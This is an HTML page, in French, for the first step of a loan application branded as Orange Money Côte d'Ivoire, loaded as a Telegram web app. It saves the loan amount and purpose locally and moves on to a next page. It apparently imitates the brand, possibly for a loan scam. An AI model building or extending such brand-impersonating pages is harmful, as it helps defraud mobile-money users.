<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Money - Demande de Prêt</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --orange-primary: #f16e00; --bg-color: #e5e5e5; }
        body { background-color: var(--bg-color); margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; font-family: sans-serif; }
        .app-header { width: 100%; background-color: var(--orange-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; }
        .back-btn { color: white; text-decoration: none; font-weight: 600; }
        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0; padding: 32px 24px; border-radius: 16px; }
        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        label { font-weight: 700; margin-bottom: 10px; }
        .form-control { padding: 14px; border: 1px solid #e2e8f0; border-radius: 10px; font-size: 15px; width: 100%; }
        .btn-next { background-color: var(--orange-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer-banner { text-align: center; padding: 20px; font-size: 12px; color: #666; margin-top: auto; }
    </style>
</head>
<body>
<div class="app-header">
    <a href="index.html" class="back-btn">← Retour</a>
    <div style="font-weight:800; font-size:20px;"><span style="color:#d64d00">Orange</span>Money</div>
    <div></div>
</div>
<div class="card">
    <h1 style="text-align:center; font-size:26px;">Demande de Prêt</h1>
    <div style="text-align:center; color:#888; margin-bottom:20px;">Étape 1 sur 3</div>
    <form onsubmit="submitStep1(event)">
        <div class="form-group">
            <label>Type de Prêt</label>
            <select id="loanType" class="form-control">
                <option value="Prêt Personnel">Prêt Personnel</option>
                <option value="Prêt Professionnel">Prêt Professionnel</option>
            </select>
        </div>
        <div class="form-group">
            <label>Montant du Prêt (FCFA)</label>
            <input type="number" id="loanAmt" class="form-control" value="250000" required>
        </div>
        <div class="form-group">
            <label>Objet du Prêt</label>
            <textarea id="loanPurpose" class="form-control" placeholder="Objet..." required></textarea>
        </div>
        <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
    </form>
</div>
<div class="footer-banner">© 2026 Orange Money Côte d'Ivoire</div>
<script>
    function submitStep1(e) {
        e.preventDefault();
        localStorage.setItem('appliedAmount', document.getElementById('loanAmt').value);
        localStorage.setItem('appliedPurpose', document.getElementById('loanPurpose').value);
        window.location.href = "page3.html";
    }
</script>
</body>
</html>
